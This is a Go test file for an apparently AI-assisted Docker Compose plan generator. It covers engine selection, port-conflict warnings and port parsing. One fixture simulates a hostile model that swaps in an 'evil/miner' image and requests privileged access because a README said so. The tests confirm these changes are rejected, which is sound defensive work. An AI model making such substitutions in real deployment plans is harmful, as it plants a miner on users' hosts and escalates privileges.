}

// fillAnswer is what a model asked in the fill schema says about a plan:
// it can carry no image, need or service the plan does not have.
func fillAnswer(plan *ir.IR) ir.FillAnswer {
	answer := ir.FillAnswer{Summary: plan.App.Summary, PostInstallNotes: plan.PostInstallNotes, SuspiciousInstructions: plan.SuspiciousInstructions,
		Confidence: plan.Confidence, Services: []ir.ServiceFill{}, EnvFile: []ir.Description{}}
	for _, service := range plan.Services {
		answer.Services = append(answer.Services, ir.ServiceFill{Name: service.Name, Role: service.Role, Healthcheck: service.Healthcheck, Ports: service.Ports})
	}
	for _, entry := range plan.EnvFile {
		answer.EnvFile = append(answer.EnvFile, ir.Description{Key: entry.Key, Description: entry.Description})
	}
	return answer
}

// offersOptional is a model that lists an optional service of its own.
func offersOptional(plan *ir.IR) {
	plan.OptionalServices = []ir.OptionalService{{Name: "extra", Image: "example/extra:1", Profiles: []string{"extra"}, DependsOn: []string{}}}
}

func TestEngines(t *testing.T) {
	hostile := func(plan *ir.IR) {
		plan.App.Summary = "A feed reader the model described."
		plan.Services[0].Image.Repository = "evil/miner"
		plan.Needs = []ir.Need{{Capability: ir.NeedPrivileged, Service: plan.Services[0].Name, Reason: "README said so",
			Provenance: ir.Provenance{Source: ir.SourceReadme, SourceRef: "README.md:1", Confidence: ir.ConfidenceLow}}}
		for index := range plan.EnvFile {
			plan.EnvFile[index].Description = "described by the model"
		}
	}
	cases := []struct {
		name       string
		engine     string
		model      *scriptedModel
		wantEngine string
		check      func(t *testing.T, result *Result)
	}{
		{name: "assisted fills gaps only", engine: EngineAssisted, model: &scriptedModel{change: hostile}, wantEngine: EngineAssisted,
			check: func(t *testing.T, result *Result) {
				app := result.Plan.Services[0]
				if app.Image.Repository != "miniflux/miniflux" || len(result.Plan.Needs) != 0 {
					t.Fatalf("the model changed an image or a need: %+v %+v", app.Image, result.Plan.Needs)
				}
				described := 0
				for _, entry := range result.Plan.EnvFile {
					if strings.HasSuffix(entry.Description, ir.ModelMark) {
						described++
					}
				}
				if described == 0 {
					t.Fatalf("no gap filled: %v", result.Notices)
				}
			}},
		{name: "model drafts the plan", engine: EngineModel, model: &scriptedModel{change: offersOptional}, wantEngine: EngineModel,
			check: func(t *testing.T, result *Result) {
				if len(result.Plan.OptionalServices) != 0 {
					t.Fatalf("optional services came from the model, not the rules: %+v", result.Plan.OptionalServices)
				}
				for _, service := range result.Plan.Services {
					if service.Provenance.Source != ir.SourceModel || service.Image.Provenance.Confidence == ir.ConfidenceHigh {
						t.Fatalf("%s not stamped as model output: %+v", service.Name, service.Provenance)
					}
				}
			}},
		{name: "provider failure falls back to rules", engine: EngineAssisted, model: &scriptedModel{err: errors.New("connection refused")}, wantEngine: EngineRules,
			check: func(t *testing.T, result *Result) {
				if !strings.Contains(strings.Join(result.Notices, "\n"), "connection refused") {
					t.Fatalf("no fallback notice: %v", result.Notices)
				}
			}},
		{name: "rules engine never asks", engine: EngineRules, model: &scriptedModel{change: hostile}, wantEngine: EngineRules,
			check: func(t *testing.T, result *Result) {}},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			dependencies := testDependencies(t, &scriptedDocker{states: []string{healthy}})
			dependencies.Assistant = llm.NewAssistant(testCase.model, "configured", 60000)
			options := testOptions()
			options.RunSandbox, options.Engine = false, testCase.engine
			result, err := Generate(context.Background(), dependencies, options)
			if err != nil {
				t.Fatal(err)
			}
			if result.Engine != testCase.wantEngine {
				t.Fatalf("engine %s, want %s (notices %v)", result.Engine, testCase.wantEngine, result.Notices)
			}
			if testCase.engine == EngineRules && testCase.model.requests != 0 {
				t.Fatal("the rules engine called the model")
			}
			testCase.check(t, result)
			stored, err := dependencies.Workspace.Store.LatestGeneration(context.Background(), result.Project.ID)
			if err != nil {
				t.Fatal(err)
			}
			calledModel := testCase.wantEngine != EngineRules
			if stored.Engine != testCase.wantEngine || (stored.PromptHash != "") != calledModel || (stored.Model == "scripted-1") != calledModel {
				t.Fatalf("generation record: engine %s, model %q, hash %q", stored.Engine, stored.Model, stored.PromptHash)
			}
		})
	}
}

// TestRunningContainerPortWarns: a running container binding the plan's
// host port is warned about, the project's own deployed containers and
// sandbox runs are not, and a chosen port is kept by a regeneration.
func TestRunningContainerPortWarns(t *testing.T) {
	running := `{"Names":"kuma","Ports":"0.0.0.0:8080->3001/tcp, [::]:8080->3001/tcp","Labels":""}
{"Names":"miniflux-miniflux-1","Ports":"127.0.0.1:8080->8080/tcp","Labels":"com.docker.compose.project=miniflux"}
{"Names":"cw-miniflux-1-miniflux-1","Ports":"127.0.0.1:8080->8080/tcp","Labels":"io.composewright.sandbox=cw-miniflux-1"}`
	dependencies := testDependencies(t, &scriptedDocker{running: running})
	result := generated(t, dependencies)
	var warnings []string
	for _, finding := range result.Report.Findings {
		if finding.Rule == "P4" && finding.FreePort > 0 {
			warnings = append(warnings, finding.Message)
		}
	}
	if want := []string{"host port 8080 is also bound by running container kuma on this Docker host"}; !slices.Equal(warnings, want) {
		t.Fatalf("P4 port warnings = %q, want %q", warnings, want)
	}
	options := testOptions()
	options.RunSandbox, options.Ports = false, map[string]int{"miniflux:8080": 8081, "miniflux:1": 9}
	chosen, err := Generate(context.Background(), dependencies, options)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(chosen.Files.Compose), "127.0.0.1:8081:8080/tcp") || chosen.Report.Has("P4", policy.Warn) {
		t.Fatalf("the chosen port was not published or still warns:\n%s", chosen.Files.Compose)
	}
	if !slices.ContainsFunc(chosen.Notices, func(notice string) bool { return strings.Contains(notice, "miniflux:1") }) {
		t.Fatalf("a port the plan lacks was dropped silently: %v", chosen.Notices)
	}
	regeneration, err := load(t, dependencies, "miniflux").Regeneration(nil, "")
	if err != nil || regeneration.Ports["miniflux:8080"] != 8081 {
		t.Fatalf("a regeneration lost the chosen port: %v %v", regeneration.Ports, err)
	}
}

// TestRepairKeepsTheChosenPort: a repair that publishes the container port
// on another host port gets the chosen one back.
func TestRepairKeepsTheChosenPort(t *testing.T) {
	dependencies := testDependencies(t, &scriptedDocker{states: []string{unhealthy, healthy}})
	dependencies.Approve = func(*Result) (bool, error) { return true, nil }
	dependencies.Repairer = &fakeRepairer{mutate: func(plan *ir.IR) { plan.Services[0].Ports[0].HostPort = 8080 }}
	options := testOptions()
	options.Ports = map[string]int{"miniflux:8080": 8081}
	result, err := Generate(context.Background(), dependencies, options)
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Verdicts) != 2 || !strings.Contains(string(result.Files.Compose), "127.0.0.1:8081:8080/tcp") {
		t.Fatalf("verdicts %d, the repair lost the chosen port:\n%s", len(result.Verdicts), result.Files.Compose)
	}
}

func TestParsePortChoice(t *testing.T) {
	if key, host, err := ParsePortChoice(PortChoice("app", 8080, 8081)); key != "app:8080" || host != 8081 || err != nil {
		t.Fatalf("ParsePortChoice = %q, %d, %v", key, host, err)
	}
	for _, text := range []string{"app:8080", "app=8081", ":8080=8081", "app:x=8081", "app:8080=0", "app:8080=65536"} {
		if _, _, err := ParsePortChoice(text); err == nil {
			t.Errorf("ParsePortChoice(%q) accepted it", text)
		}
	}
}
